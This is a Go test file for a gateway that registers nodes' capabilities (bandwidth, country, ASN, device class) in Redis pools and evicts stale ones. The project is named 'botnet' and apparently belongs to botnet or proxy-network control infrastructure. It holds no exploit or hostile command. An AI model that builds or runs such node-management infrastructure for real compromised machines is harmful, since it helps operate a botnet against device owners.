package main

import (
	"context"
	"testing"
	"time"

	"github.com/botnet/botnet/internal/agent"
	"github.com/botnet/botnet/internal/backend/testenv"
	"github.com/botnet/botnet/pkg/proto"
)

func nodeFixture(t *testing.T) [16]byte {
	t.Helper()
	var id [16]byte
	for i := range id {
		id[i] = byte(i*7 + 1)
	}
	return id
}

// AC1: tras el primer HELLO, node:$ID:caps tiene exactly {bw_mbps, iso2,
// asn, device_class} con TTL 24 h y smembers gw:pool:$GW contiene al nodo.
func TestPublishHelloCapsRedisShape(t *testing.T) {
	rdb := testenv.Redis(t)
	ctx := context.Background()
	pub := &CapsPublisher{RDB: rdb, GWID: "gw-mad-1"}
	id := nodeFixture(t)
	caps := proto.HelloCaps{BWMbps: 42, ISO2: "ES", ASN: 3320, DeviceClass: 'A'}

	if err := pub.Publish(ctx, id, caps); err != nil {
		t.Fatalf("Publish: %v", err)
	}

	key := CapsKey(agent.FormatUUID(id))
	got, err := rdb.HGetAll(ctx, key).Result()
	if err != nil {
		t.Fatalf("HGETALL: %v", err)
	}
	if len(got) != 4 {
		t.Fatalf("caps must have exactly 4 fields, got %d: %v", len(got), got)
	}
	if got[CapsFieldBWMbps] != "42" || got[CapsFieldISO2] != "ES" ||
		got[CapsFieldASN] != "3320" || got[CapsFieldDeviceClass] != "A" {
		t.Fatalf("valores caps: %v", got)
	}
	ttl, err := rdb.TTL(ctx, key).Result()
	if err != nil {
		t.Fatalf("TTL: %v", err)
	}
	if ttl <= 0 || ttl > CapsTTLDefault {
		t.Fatalf("TTL caps: %v (must be <= 24h and vivo)", ttl)
	}
	isMember, err := rdb.SIsMember(ctx, PoolKey("gw-mad-1"), agent.FormatUUID(id)).Result()
	if err != nil || !isMember {
		t.Fatalf("el nodo debe estar en gw:pool: %v %v", isMember, err)
	}

	// Idempotencia: re-HELLO no duplica miembros ni campos.
	if err := pub.Publish(ctx, id, caps); err != nil {
		t.Fatalf("re-Publish: %v", err)
	}
	if n, _ := rdb.SCard(ctx, PoolKey("gw-mad-1")).Result(); n != 1 {
		t.Fatalf("SCARD pool: %d", n)
	}
}

// AC2 (asociado): el HELLO viaja como FrameHello por el tunel existente;
// IngestHello consume ese frame y publica — el gateway no abre canal
// propio de capacidades.
func TestIngestHelloFrame(t *testing.T) {
	rdb := testenv.Redis(t)
	ctx := context.Background()
	pub := &CapsPublisher{RDB: rdb, GWID: "gw-lis-1"}
	id := nodeFixture(t)
	caps := proto.HelloCaps{BWMbps: 8, ISO2: "PT", ASN: 12345, DeviceClass: 'C'}

	wire, err := agent.HelloFrame(caps, id, 1)
	if err != nil {
		t.Fatalf("HelloFrame: %v", err)
	}
	if err := pub.IngestHello(ctx, wire); err != nil {
		t.Fatalf("IngestHello: %v", err)
	}
	if v, _ := rdb.HGet(ctx, CapsKey(agent.FormatUUID(id)), CapsFieldISO2).Result(); v != "PT" {
		t.Fatalf("iso2 tras ingest: %q", v)
	}
	// Un frame de otro tipo no se cuela como HELLO.
	other, _ := proto.EncodeFrame(&proto.CtrlFrame{Type: proto.FramePing, NodeID: id})
	if err := pub.IngestHello(ctx, other); err == nil {
		t.Fatal("FramePing no es HELLO")
	}
}

// AC3: nodo sin HELLO en 24 h -> caps expira y el gateway lo saca del
// pool (SCARD decrece). Reloj acelerado: TTL de 1 s en vez de 24 h.
func TestSweepEvictsExpiredCaps(t *testing.T) {
	rdb := testenv.Redis(t)
	ctx := context.Background()
	pub := &CapsPublisher{RDB: rdb, GWID: "gw-mad-2", TTL: time.Second}
	a, b := nodeFixture(t), [16]byte{9, 9, 9}

	if err := pub.Publish(ctx, a, proto.HelloCaps{ISO2: "ES", DeviceClass: 'A'}); err != nil {
		t.Fatal(err)
	}
	if err := pub.Publish(ctx, b, proto.HelloCaps{ISO2: "ES", DeviceClass: 'B'}); err != nil {
		t.Fatal(err)
	}
	before, _ := rdb.SCard(ctx, PoolKey("gw-mad-2")).Result()

	// Solo "a" renueva (simula el HELLO periodico); "b" vence (reloj
	// acelerado: TTL 1 s ~= 24 h de produccion).
	time.Sleep(1250 * time.Millisecond)
	if err := pub.Publish(ctx, a, proto.HelloCaps{ISO2: "ES", DeviceClass: 'A'}); err != nil {
		t.Fatal(err)
	}

	removed, err := pub.Sweep(ctx)
	if err != nil {
		t.Fatalf("Sweep: %v", err)
	}
	if removed != 1 {
		t.Fatalf("expulsados: %d (esperado 1)", removed)
	}
	after, _ := rdb.SCard(ctx, PoolKey("gw-mad-2")).Result()
	if after != before-1 {
		t.Fatalf("SCARD pool: before %d after %d", before, after)
	}
	if _, err := rdb.HGetAll(ctx, CapsKey(agent.FormatUUID(b))).Result(); err != nil {
		t.Fatalf("HGETALL vacio no es error: %v", err)
	}
}
